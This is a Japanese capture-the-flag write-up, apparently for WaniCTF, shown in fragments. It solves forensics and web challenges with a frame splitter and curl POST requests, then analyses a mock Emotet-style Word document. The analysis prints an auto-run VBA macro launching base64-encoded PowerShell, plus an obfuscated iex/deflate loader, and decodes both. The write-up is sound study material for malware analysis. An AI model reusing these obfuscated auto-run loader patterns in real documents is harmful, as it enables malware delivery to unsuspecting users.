...
mp4を再生すると、サブリミナルみたいにフラグがちらちらする。
ScreenToGifでロードして解く

①起動
![image.png](./14094f1e-dc43-9e9c-4290-1de93e87e36b.png)
②ロード
![image.png](./55dd80ee-dbe6-ddf8-6157-2500308de107.png)
③フレーム画像に分割された中からフラグを見つける

### partition01

とりあえず、imgファイルを見つけたので、rufusを使ってUSBに焼いてみた。そうしたら、中身が下記のようになった。
...
developertools で、sourcesタブから探す。
...
![image.png](./3f9e7cfb-3be1-7617-e65b-d19bb307331a.png)
...
```html
<!-- debug: {"requestHeader":{"host":"post.web.wanictf.org","user-agent":"curl/7.74.0","content-length":"9","accept":"*/*","content-type":"application/x-www-form-urlencoded","x-forwarded-for":"x.x.x.x","x-forwarded-proto":"https","x-real-ip":"x.x.x.x","accept-encoding":"gzip"},"requestBody":{"data":"hoge"}} -->
```

flag 発見１：`Congratulations! Challenge 1 FLAG: y0u`

`curl -XPOST --user-agent Mozilla/5.0 -d 'data=hoge' https://post.web.wanictf.org/chal/2`

```html
<!-- debug: {"requestHeader":{"host":"post.web.wanictf.org","user-agent":"Mozilla/5.0","content-length":"9","accept":"*/*","content-type":"application/x-www-form-urlencoded","x-forwarded-for":"x.x.x.x","x-forwarded-proto":"https","x-real-ip":"x.x.x.x","accept-encoding":"gzip"},"requestBody":{"data":"hoge"}} -->
```

flag 発見２：`Congratulations! Challenge 2 FLAG: ar3`

`curl -XPOST  -H "Content-Type: application/json" -d '{"data":{"hoge":"fuga"}}' https://post.web.wanictf.org/chal/3`

```html
<!-- debug: {"requestHeader":{"host":"post.web.wanictf.org","user-agent":"curl/7.74.0","content-length":"24","accept":"*/*","content-type":"application/json","x-forwarded-for":"x.x.x.x","x-forwarded-proto":"https","x-real-ip":"x.x.x.x","accept-encoding":"gzip"},"requestBody":{"data":{"hoge":"fuga"}}} -->
```
...
if ')).replACe('cW4', [STRiNg][CHAr]34).replACe('8r3', [STRiNg][CHAr]95).replACe('fj7', [STRiNg][CHAr]36) | & ( $VerbosePrefrencE.TostRIng()[1, 3] + 'x' -Join '')
```
...
安全と書かれたemoemotet.docが与えられるので、開いてみる。

なんか漢字が羅列されたエロいファイルだが、一見してVBAとかも仕込まれてる気配なし。

[oletools](https://github.com/decalage2/oletools)をインストールする。

oletoolsの中の、olevbaを使ってみる。
...
例のごとく難読化されているので、解読する。

```vb
Sub revtool()
Debug.Print unxor(Array(214, 95, 231, 84, 214, 176, 235, 78, 206, 44, 143, 68, 150, 97, 49, 48, 56, 82, 156, 68, 43, 117, 63, 134, 143, 30, 38, 64, 222, 22), 1312)
End Sub
```

こんな感じで、解読用の関数を作ると楽だった。

```vb
Sub AutoOpenRev1()
CreateObject("WScript.Shell").Run "powershell -e LgAoACcAaQBlAFgAJwApACgAbgBFAHcALQBv" & _
...
で、`powershell -e ????`って構文が気になるので、`pwsh -h`で調べる。
...
というわけで、`-e`以降の部分はUTF-16の文字列がBase64されているらしい。

![image.png](./5da3c7f7-d9a9-0cef-e60d-9d469daea191.png)

こんな感じのpowershellコードになった。

```powershell
.('ieX')(nEw-objEct SYsteM.Io.StReAMreadEr(
        (
            nEw-objEct  SystEM.IO.COMPREssiON.deflaTEStreaM(
                [Io.MemoRysTREAM] [sYsTeM.cOnvErT]::fROMBASE64STring('bc69CsIwGIXhPVfxGRwULLSkkslBBX9AUBwUp9Amn7QQm5qkRpHeuy06Op8HzouyMEAv6CYQELR5IJwW8wElZFhWdeNhBkfMVLQxzgM9ZM4FY1U3l1cY/UiEd6Cr3Xz9DnEQvGCC3XKmFFPikaciqUSIrRJpw+NbyhOZav0S7MlkwzvS+zoOzE4LprWYSpvUvKVjeBOAsy09RvvG9z90aaxF6bu6FlA7/EO2lfyizhDyAQ=='), 
...
`.('ieX')`を`Write-Host`に入れ替えて実行してみると、解読できた。
